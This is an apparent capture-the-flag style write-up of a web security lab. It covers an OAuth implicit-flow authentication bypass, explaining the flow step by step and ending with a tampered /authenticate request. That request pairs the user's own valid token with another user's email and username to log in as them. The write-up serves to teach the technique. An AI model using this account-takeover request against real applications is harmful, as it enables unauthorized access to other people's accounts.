# Lab: Authentication bypass via OAuth implicit flow

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.

You can log in with your own social media account using the following credentials: `wiener`:`peter`.

## Analysis

**1. Authorization request**
After click to my account page we are redirected to social login page. Here, the response contain client_id, redirect_uri, response_type, nonce and scope in the meta tag.

```html
<meta 
http-equiv=refresh 
content='3;
url=https://oauth-0a9f005b03d78364c0a24d0702e500b6.oauth-server.net/auth?client_id=oy765r4a67uufy1drra4k&
redirect_uri=https://0a5000c203ff837fc0354f7d00cf002c.web-security-academy.net/oauth-callback&response_type=token&
nonce=1132317618&
scope=openid profile email'
>
```

- client_id: Mandatory parameter containing the unique identifier of the client application. This value is generated when the client application registers with the OAuth service.
- redirect_uri: The URI to which the user's browser should be redirected when sending the authorization code to the client application. This is also known as the "callback URI" or "callback endpoint". Many OAuth attacks are based on exploiting flaws in the validation of this parameter
- response_type: Determines which kind of response the client application is expecting and, therefore, which flow it wants to initiate. For the authorization implicit grant type, the value should be token.
- scope: Used to specify which subset of the user's data the client application wants to access. Note that these may be custom scopes set by the OAuth provider or standardized scopes defined by the [OpenID Connect](https://portswigger.net/web-security/oauth/openid) specification.

**2. User login and consent**
Using the information above `GET /auth?client_id=oy765r4a67uufy1drra4k&redirect_uri=https://0a5000c203ff837fc0354f7d00cf002c.web-security-academy.net/oauth-callback&response_type=token&nonce=-1895431735&scope=openid%20profile%20email HTTP/1.1` to get form login with social account and consent to the requested permissions or not.

**3. Access token grant** 
The OAuth service will redirect the user's browser to the redirect_uri specified in the authorization request. However, it will send the access token and other token-specific data as a URL fragment.

As the access token is sent in a URL fragment, it is never sent directly to the client application. Instead, the client application must use a suitable script to extract the fragment and store it.

**4. API call** 
Once the client application has successfully extracted the access token from the URL fragment, it can use it to make API calls to the OAuth service's /me endpoint. Unlike in the authorization code flow, this also happens via the browser.

Request
```http
GET /me HTTP/1.1
Host: oauth-0a9f005b03d78364c0a24d0702e500b6.oauth-server.net
Authorization: Bearer epQ4mDQGLSZdOVL5xx7pVp7V9zPq7nOzu_sjjcjPdsd
```

Response
```json
{
    "sub":"wiener",
    "name":"Peter Wiener",
    "email":"wiener@hotdog.com",
    "email_verified":true
}
```

**5. Resource grant**
The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource i.e. the user's data based on the scope associated with the access token.

```http
POST /authenticate HTTP/1.1
Host: 0a5000c203ff837fc0354f7d00cf002c.web-security-academy.net
Cookie: session=4642yYgoveXhldW8iDfwjCY48m45kTgo

{
    "email":"wiener@hotdog.com",
    "username":"wiener",
    "token":"epQ4mDQGLSZdOVL5xx7pVp7V9zPq7nOzu_sjjcjPdsd"
}
```

After post that request we already logged in successfully with wiener's social account.

## Exploit

The problem is resource server verify based on access token, so we keep token valid of wiener then modify email and username to carlos. By this the resource server has allowed us login with carlos's social account

```http
POST /authenticate HTTP/1.1
Host: 0a5000c203ff837fc0354f7d00cf002c.web-security-academy.net
Cookie: session=4642yYgoveXhldW8iDfwjCY48m45kTgo

{
    "email":"carlos@carlos-montoya.net",
    "username":"carlos",
    "token":"epQ4mDQGLSZdOVL5xx7pVp7V9zPq7nOzu_sjjcjPdsd"
}
```

Post that request then show response in browser and that's it we solved it